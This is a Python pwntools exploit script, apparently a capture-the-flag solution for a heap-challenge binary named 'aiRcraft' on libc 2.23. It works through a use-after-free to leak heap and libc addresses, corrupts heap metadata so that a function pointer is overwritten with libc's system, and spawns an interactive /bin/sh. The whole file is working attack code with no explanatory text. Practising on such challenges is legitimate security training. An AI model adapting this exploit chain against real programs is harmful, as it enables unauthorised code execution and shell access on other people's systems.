#!/usr/bin/env python3
from pwn import *
from time import sleep

exe = ELF("./aiRcraft_patched")
libc = ELF("./libc-2.23.so")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
context.log_level = "debug"
#context.aslr = False

global io
breakpoints = '''
break *0x5555554013f4
continue
'''+"continue\n"*28

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def buy_plane(name,model=1):
    sla("choice: ", b"1")
    if type(name) != type(b"A"):
        name = name.encode()
    sla("choice: ", str(model).encode())
    sla("name: ", name)

def build_airport(name,size=256):
    sla("choice: ", b"2")
    sla("name? ", str(size).encode())
    sla("name: ", name.encode())

def enter_airport(id,option):
    sla("choice: ", b"3")
    sla("choose? ", str(id).encode())
    sla("choice: ", str(option).encode())

def fly_plane(airport,plane):
    sla("choice: ", b"4")
    sla("choose? ", str(plane).encode())
    sla("choice: ", b"1")
    sla("fly? ", str(airport).encode())
    sla("choice: ", b"3")    

def sell_plane(plane):
    sla("choice: ", b"4")
    sla("choose? ", str(plane).encode())
    sla("choice: ", b"2")

def leak(id):
    sla("choice: ", b"3")
    print("Hi")
    sla("choose? ", str(id).encode())
    sla("choice: ", b"1")
    reu("name: ")
    r = reu("choice: ")
    sl(b"3")
    return r
def exit_menu():
    sla("choice: ", b"3")

def heap_leak():
    build_airport("heap")
    buy_plane("/bin/sh")
    buy_plane("BBBB")
    buy_plane("CCCC")
    sell_plane("BBBB")

    fly_plane(0,"/bin/sh")
    sell_plane("/bin/sh")
    heap = unpack(leak(0)[:6],48) - 0x1f0
    assert heap > 0x55ffffffffff
    buy_plane("/bin/sh")
    buy_plane("BBBB")
    return heap

def libc_leak():
    build_airport("libc")
    build_airport("temp")
    buy_plane("fast", 14)
    fly_plane(2,"fast")
    enter_airport(1,2)
    libc = unpack(leak(2)[14:20],48) - 0x3c4b78
    build_airport("libc") 
    return libc

def pwn():
    build_airport("hehe",0x18)
    buy_plane("XXXX")
    buy_plane("YYYY")
    buy_plane("Q"*24)
    fly_plane(4,"XXXX")
    fly_plane(4,"YYYY")
    fly_plane(4,"XXXX")
    fly_plane(3, "Q"*24)
    enter_airport(3,2)
    enter_airport(2,2)
    enter_airport(4,2)

    buy_plane(p64(heap+0x1cd))
    buy_plane("Z"+"\x00"*7)
    buy_plane("yeet")

    payload = flat([
        b"\x00"*3,
        heap+0x840,
        0,
        libc.symbols["system"]
        ])
    buy_plane(payload)
    sell_plane("/bin/sh")


heap = heap_leak()
log.info("Heap -> "+hex(heap))

libc.address = libc_leak()
log.info("Libc -> "+hex(libc.address))

pwn()

io.interactive()